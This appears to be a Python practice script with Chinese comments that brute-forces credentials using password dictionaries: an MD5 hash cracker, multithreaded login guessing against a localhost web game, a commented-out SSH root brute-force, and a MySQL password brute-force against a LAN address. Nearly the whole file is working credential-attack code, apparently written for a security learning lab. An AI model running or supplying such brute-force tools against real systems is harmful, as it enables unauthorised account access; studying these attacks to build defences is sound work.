import hashlib,time,requests,threading

count = 0
#使用字典爆破MD5
def md5(source):
    with open('../dict/password_top500.txt') as f:
        pw_list = f.readlines()
    #同时导入多份字典
    with open('../dict/password_top1000.txt') as f:
        pw_list2 = f.readlines()
    pw_list.extend(pw_list2)
    for password in pw_list:
        if source == hashlib.md5(password.strip().encode()).hexdigest():
            print(f"破解成功,明文为:{password.strip()}")


#爆破种菜游戏
#用户名已知，密码未知
def ws_single():
    global count
    with open('../dict/password_top500.txt') as f:
        pw_list = f.readlines()

    url = 'http://localhost/learn/farmingGame/login-2-1.php'

    for password in pw_list:
        data = {'username':'xu','password':password.strip()}
        resp = requests.post(url=url,data=data)
        count += 1
        if 'login-fail' not in resp.text:
            print(f'疑似破解成功密码为:{password.strip()}')
            print(f'共计尝试{count}次')
            exit()

#未知用户名，未知密码,多线程破解，一个用户一个线程
def ws_thread(username):
    global count
    with open('../dict/password_top500.txt') as f:
        pw_list = f.readlines()
    url = 'http://localhost/learn/farmingGame/login-2-1.php'

    for password in pw_list:
        data = {'username': username, 'password': password.strip()}
        resp = requests.post(url=url, data=data)
        count += 1
        if ':(登陆失败' not in resp.text:
            print(f'疑似破解成功密码为:{password.strip()}')
            print(f'共计尝试{count}次')
            exit()

#每个线程处理10个用户
def ws_thread_10(sublist):
    global count
    with open('../dict/password_top500.txt') as f:
        pw_list = f.readlines()
    url = 'http://localhost/learn/farmingGame/login-2-1.php'
    for username in sublist:
        for password in pw_list:
            data = {'username': username.strip(), 'password': password.strip()}
            resp = requests.post(url=url, data=data)
            count += 1
            if ':(登陆失败' not in resp.text:
                print(f'疑似破解成功,账号为:{username.strip()}密码为:{password.strip()}')
                print(f'共计尝试{count}次')
                exit()

#爆破ssh
#防护方法：使用证书进行登录
# def ssh_crack():
#     import paramiko
#     with open('../dict/password_top500.txt') as f:
#         pw_list = f.readlines()
#     for password in pw_list:
#         try:
#             transport = paramiko.Transport(('192.168.142.207', 22))
#             transport.connect(username='root', password=password.strip())
#             print(f'登录成功，密码为:{password.strip()}')
#             exit(0)
#         except:
#             pass
#         time.sleep(2)

#爆破mysql
def mysql_crack():
    import pymysql
    with open('../dict/password_top500.txt') as f:
        pw_list = f.readlines()
        for password in pw_list:
            try:
                conn = pymysql.connect(host='192.168.142.207', user='wei', password=password.strip())
                print(f'登录成功,密码为:{password.strip()}')
                exit(0)
            except:
                pass

if __name__ == '__main__':
    # md5('c2fc2f64438b1eb36b7e244bdb7bd535')
    # ws_single()

    #读取用户字典并获取用户名,每个用户一个线程
    # with open('../dict/username_top500.txt') as f:
    #     un_list = f.readlines()
    # for username in un_list:
    #     threading.Thread(target=ws_thread,args=(username.strip(),)).start()


    #每个线程负责十个用户
    #给线程分配任务的方式：用特征分组，或这里的用列表的切片来分
    # with open('../dict/username_top500.txt') as f:
    #     user_list = f.readlines()
    # for i in range(0, len(user_list), 10):
    #     sublist = user_list[i:i + 10]
    #     threading.Thread(target=ws_thread_10,args=(sublist,)).start()

    # ssh_crack()
    mysql_crack()